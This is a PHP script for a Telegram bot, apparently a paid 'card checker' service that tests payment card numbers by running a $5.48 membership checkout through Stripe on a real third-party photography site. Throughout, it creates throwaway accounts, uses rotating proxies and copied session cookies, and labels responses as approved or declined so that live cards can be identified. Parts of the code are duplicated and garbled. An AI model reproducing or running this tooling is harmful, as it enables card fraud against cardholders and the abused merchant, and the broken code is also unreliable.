<?php


error_reporting(E_ALL);
ini_set('display_errors', 1);

ini_set('log_errors', TRUE);
ini_set('error_log', 'errors.log');


  //=========RANK DETERMINE=========//
  $currentDate = date('Y-m-d');
      $rank = "FREE";
      $expiryDate = "0";

      $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
      $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
      $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

$gate = "Stripe 5.48$";
$gcm = "/stp";


    if(in_array($userId, $owners)) {
          $rank = "OWNER";
         $expiryDate = "UNTIL DEAD"; 
      } else { 
          foreach ($paidUsers as $index => $line) {
              list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
              if ($userIdFromFile == $userId) {
                  if ($userExpiryDate < $currentDate) {
                      unset($paidUsers[$index]); //
                      file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                      $freeUsers[] = $userId; // add to free users list
                      file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                  } else    $currentDate = date('Y-m-d');
      $rank = "FREE";
      $expiryDate = "0";

      $paidUsers = file('Database/paid.txt', FILE_IGNORE_NEW_LINES);
      $freeUsers = file('Database/free.txt', FILE_IGNORE_NEW_LINES);
      $owners = file('Database/owner.txt', FILE_IGNORE_NEW_LINES);

      if(in_array($userId, $owners)) {
          $rank = "OWNER";
         $expiryDate = "UNTIL DEAD"; 
      } else {
          foreach ($paidUsers as $index => $line) {
              list($userIdFromFile, $userExpiryDate) = explode(" ", $line);
              if ($userIdFromFile == $userId) {
                  if ($userExpiryDate < $currentDate) {
                      unset($paidUsers[$index]); 
                      file_put_contents('Database/paid.txt', implode("\n", $paidUsers));
                      $freeUsers[] = $userId; 
                      file_put_contents('Database/free.txt', implode("\n", $freeUsers));
                  } else {
                      $rank = "PAID";
                      $expiryDate = $userExpiryDate;
                  }
              }
          }
      } {
                      $rank = "PAID";
                      $expiryDate = $userExpiryDate;
                  }
              }
          }
      }
  //=======RANK DETERMINE END=========//
  $update = json_decode(file_get_contents("php://input"), TRUE);
  $text = $update["message"]["text"];
  //========WHO CAN CHECK FUNC========//

  //=====WHO CAN CHECK FUNC END======//
  if (preg_match('/^(\/stp|\.stp|!stp)/', $text)) {
      $userid = $update['message']['from']['id'];

    if (!checkAccess($userid)) {
        $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b> @$username You're not Premium user❌</b>", $message_id);
        exit();
    }
  $start_time = microtime(true);

    $chatId = $update["message"]["chat"]["id"];
      $message_id = $update["message"]["message_id"];
      $keyboard = "";

  //=======WHO CAN CHECK END========//

  //====ANTISPAM AND WRONG FORMAT====//
      if (strlen($message) <= 4) {
              sendMessage($chatId, "!𝙔𝙤𝙪 𝘿𝙪𝙢𝙗𝙤 𝘼𝙨𝙨 𝙃𝙤𝙡𝙚!%0A𝙏𝙚𝙭𝙩 𝙎𝙝𝙤𝙪𝙡𝙙 𝙊𝙣𝙡𝙮 𝘾𝙤𝙣𝙩𝙖𝙞𝙣 - <code>$gcm cc|mm|yy|cvv</code>%0A𝙂𝙖𝙩𝙚𝙬𝙖𝙮 - <b>$gate</b>", $message_id);
              exit();
    }
  $r = "0";

  $r = rand(0, 100);
  //==ANTISPAM AND WRONG FORMAT END==//


  //=======checker part start========//
  if ($_SERVER['REQUEST_METHOD'] == "POST") {
      extract($_POST);
  } elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
      extract($_GET);
  }
  function inStr($string, $start, $end, $value) {
      $str = explode($start, $string);
      $str = explode($end, $str[$value]);
      return $str[0];
  }


  $lista = substr($message, 5);
  $separa = explode("|", $lista);
  $cc = isset($separa[0]) ? substr($separa[0], 0, 16) : ''; // Get only first 16 digits
  $mes = isset($separa[1]) ? $separa[1] : '';
  $ano = isset($separa[2]) ? $separa[2] : '';
  $cvv = isset($separa[3]) ? $separa[3] : '';


  $last4 = substr($cc, -4);


  $sent_message_id = send_reply($chatId, $message_id, $keyboard, "<b>REVIEWING YOU'RE REQUEST ✅</b>");

  function value($str,$find_start,$find_end)
  {
      $start = @strpos($str,$find_start);
      if ($start === false) 
      {
          return "";
      }
      $length = strlen($find_start);
      $end    = strpos(substr($str,$start +$length),$find_end);
      return trim(substr($str,$start +$length,$end));
  }

  function mod($dividendo,$divisor)
  {
      return round($dividendo - (floor($dividendo/$divisor)*$divisor));
  }
  //================[Functions and Variables]================//
  #------[Email Generator]------#



  function emailGenerate($length = 10)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString . '@gmail.com';
  }
  $email = emailGenerate();
  #------[Username Generator]------#
  function usernameGen($length = 13)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
  }
  $un = usernameGen();
  #------[Password Generator]------#
  function passwordGen($length = 15)
  {
      $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
      $charactersLength = strlen($characters);
      $randomString     = '';
      for ($i = 0; $i < $length; $i++) {
          $randomString .= $characters[rand(0, $charactersLength - 1)];
      }
      return $randomString;
  }
  $pass = passwordGen();

  #------[CC Type Randomizer]------#

   $cardNames = array(
      "3" => "American Express",
      "4" => "Visa",
      "5" => "MasterCard",
      "6" => "Discover"
   );
   $card_type = $cardNames[substr($cc, 0, 1)];





    //==================[Randomizing Details]======================//


  //==============[Randomizing Details-END]======================//



    //==================[BIN LOOK-UP]======================//

    $ch = curl_init();

    $bin = substr($cc, 0, 6);

    curl_setopt($ch, CURLOPT_URL, 'https://binlist.io/lookup/' . $bin . '/');
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
    $bindata = curl_exec($ch);
    $binna = json_decode($bindata, true);
    $brand = $binna['scheme'];
    $country = $binna['country']['name'];
    $alpha2 = $binna['country']['alpha2'];
    $emoji = $binna['country']['emoji'];
    $type = $binna['type'];
    $category = $binna['category'];
    $bank = $binna['bank']['name'];
    $url = $binna['bank']['url'];
    $phone = $binna['bank']['phone'];
    curl_close($ch);

    $bank = "$bank";
    $country = "$country $emoji ";
    $bin = "$bin - ($alpha2) -[$emoji] ";
    $bininfo = "$type - $brand - $category";
    $url = "$url";
    $type = strtoupper($type);

  //==================[BIN LOOK-UP-END]======================//



    sleep(1);
        edit_sent_message($chatId, $sent_message_id, "<b>[×] PROCESS - ■□□□
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>");

  //=======================[5 REQ]==================================//
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $socks5);
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array();
  $headers[] = 'Host: api.stripe.com';
  $headers[] = 'Accept: application/json';
  $headers[] = 'Accept-Language: en-US,en;q=0.8';
  $headers[] = 'Content-Type: application/x-www-form-urlencoded';
  $headers[] = 'Path: /v1/payment_methods';
  $headers[] = 'Origin: https://js.stripe.com';
  $headers[] = 'Referer: https://js.stripe.com/';
  $headers[] = 'sec-ch-ua: "Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"';
  $headers[] = 'sec-ch-ua-mobile: ?0';
  $headers[] = 'sec-ch-ua-platform: "Windows"';
  $headers[] = 'Sec-Fetch-Dest: empty';
  $headers[] = 'Sec-Fetch-Mode: cors';
  $headers[] = 'Sec-Fetch-Site: same-site';
  $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188';
  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=1fa816a3-cb1f-4128-be42-7282b81afcb1a3a78f&muid=5293a29c-5542-49b2-b73b-ddedb0e9ac250ccf94&sid=abce1998-3c48-4059-bb2a-c31d3ed4ec4e3b9311&pasted_fields=number&payment_user_agent=stripe.js%2F3b6d306271%3B+stripe-js-v3%2F3b6d306271%3B+split-card-element&referrer=https%3A%2F%2Floeildelaphotographie.com&time_on_page=105590&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_1ApAkbAB5PUYB3zJ');

  $result1 = curl_exec($ch);
  $id = trim(strip_tags(getStr($result1,'"id": "','"')));
  $brandi = trim(strip_tags(getStr($result1,'"brand": "','"')));

  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

    sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>[×] PROCESS - ■■□□
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>");

  //==================req 1 end===============//
  //==================req 2===============//
  $ch = curl_init();
  curl_setopt($ch, CURLOPT_PROXY, $socks5);
  curl_setopt($ch, CURLOPT_PROXYUSERPWD, $rotate);
  curl_setopt($ch, CURLOPT_URL, 'https://loeildelaphotographie.com/en/membership-account/membership-checkout/?level=2');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_HEADER, 0);
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
              curl_setopt($ch, CURLOPT_POST, 1);
  $headers = array(
    'authority: loeildelaphotographie.com',
    'method: POST',
    'path: /en/membership-account/membership-checkout/?level=2',
    'scheme: https',
    'accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'accept-Language: en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
    'cnntent-Type: application/x-www-form-urlencoded',
    'cookie: asp_transient_id=6bd3b9d524d799840e7fbd67ab13d758;qtrans_front_language=en;_ga=GA1.1.222948458.1704730782;__stripe_mid=5293a29c-5542-49b2-b73b-ddedb0e9ac250ccf94;PHPSESSID=vmciu2f0aq1jcqvq89rb0dv0g4;pmpro_visit=1;cf_clearance=u4US1p7uJLcXWywqokHgQ4VFiEdLr8mx6Zkc4iS7vOA-1704736817-0-2-379698f5.d6ee5f00.447a503-0.2.1704736817;__stripe_sid=abce1998-3c48-4059-bb2a-c31d3ed4ec4e3b9311;_ga_67G7FEZTLP=GS1.1.1704736816.2.0.1704736837.0.0.0',
    'origin: https://www.loeildelaphotographie.com',
    'referer: https://loeildelaphotographie.com/en/membership-account/membership-checkout/?level=2',
    'sec-Fetch-Dest: document',
    'sec-Fetch-Mode: navigate',
    'sec-Fetch-Site: same-origin',
    'user-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
    );

sleep(1);
    edit_sent_message($chatId, $sent_message_id, "<b>[×] PROCESS - ■■■□
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>");


  curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
  curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
  curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
  curl_setopt($ch, CURLOPT_POSTFIELDS, 'level=2&checkjavascript=1&donation_dropdown=0&donation=&other_discount_code=&username='.$pass.'&password=abhyan3434&password2=abhyan3434&bemail='.$email.'&bconfirmemail='.$email.'&fullname=&gateway=stripe&CardType='.$brandi.'&discount_code=&submit-checkout=1&javascriptok=1&submit-checkout=1&javascriptok=1&payment_method_id='.$id.'&AccountNumber=XXXXXXXXXXXX'.$last4.'&ExpirationMonth='.$mes.'&ExpirationYear='.$ano.'');


  curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
  curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

  $result2 = curl_exec($ch);
  $msg = trim(strip_tags(getStr($result2,'<div id="pmpro_message_bottom" class="pmpro_message pmpro_error">','</div>')));

  //==================req 2 end===============//



    sleep(1);
        edit_sent_message($chatId, $sent_message_id, "<b>[×] PROCESS - ■■■■
- - - - - - - - - - - - - - - - - - -
[×] CARD ↯ <code>$lista</code>
[×] GATEWAY ↯ $gate
[×] BANK ↯ $bank
[×] TYPE ↯ $bininfo
[×] COUNTRY ↯ $country
- - - - - - - - - - - - - - - - - - -
|×| MAXIMUM TIME ↯ 25 SEC
|×| REQ BY ↯ @$username</b>");

    //======checker part end=========//
$end_time = microtime(true);
    $time = number_format($end_time - $start_time, 2);


  if (
      strpos($result2, 'Thank you for your membership.') !== false ||
      strpos($result2, "Membership Confirmation") !== false ||
      strpos($result2, 'Your card zip code is incorrect.') !== false ||
      strpos($result2, "Thank You For Donation.") !== false ||
      strpos($result2, "incorrect_zip") !== false ||
      strpos($result2, "Success ") !== false ||
      strpos($result2, '"type":"one-time"') !== false ||
      strpos($result2, "/donations/thank_you?donation_number=") !== false
  ) {
    $resp = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>$gate</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>5.48$ Charge Successfully 🟢</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";
  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif (
      strpos($result2, 'Error updating default payment method.Your card does not support this type of purchase.') !== false ||
      strpos($result2, "Your card does not support this type of purchase.") !== false ||
      strpos($result2, 'transaction_not_allowed') !== false ||
      strpos($result2, "insufficient_funds") !== false ||
      strpos($result2, "incorrect_zip") !== false ||
      strpos($result2, "Your card has insufficient funds.") !== false ||
      strpos($result2, '"status":"success"') !== false ||
      strpos($result2, "stripe_3ds2_fingerprint") !== false
  ) {
  $resp = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>$gate</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>1000:Approved 🟢</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif (
      strpos($result2, 'security code is incorrect.') !== false ||
      strpos($result2, 'security code is invalid.') !== false ||
      strpos($result2, "Your card's security code is incorrect.") !== false
  ) {
  $resp = "𝗔𝗽𝗽𝗿𝗼𝘃𝗲𝗱 ✅

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>$gate</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>$msg 🟢</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }


  elseif(strpos($result2, "Error updating default payment method. Your card was declined.")) {
  $resp = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>$gate</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>$msg 🔴</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }

  elseif(strpos($result2, "Unknown error generating account. Please contact us to set up your membership.")) {
  $resp = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>$gate</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>$msg 🔴</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }

  else {
  $resp = "𝗗𝗲𝗰𝗹𝗶𝗻𝗲𝗱 ❌

𝐂𝐚𝐫𝐝 ↯ <code>$lista</code>
𝐆𝐚𝐭𝐞𝐰𝐚𝐲 ↯ <code>$gate</code>
𝐑𝐞𝐬𝐩𝐨𝐧𝐬𝐞 ↯ <code>$msg 🔴</code>

𝐁𝐢𝐧 𝐈𝐧𝐟𝐨 ↯ <code>$bininfo</code> 
𝐁𝐚𝐧𝐤 ↯ <code>$bank</code>
𝐂𝐨𝐮𝐧𝐭𝐫𝐲 ↯ <code>$country</code>

𝐓𝐢𝐦𝐞 ↯ <code>$time Seconds</code>
$botu";

  sleep(1);
  edit_sent_message($chatId, $sent_message_id, $resp);
  }
  }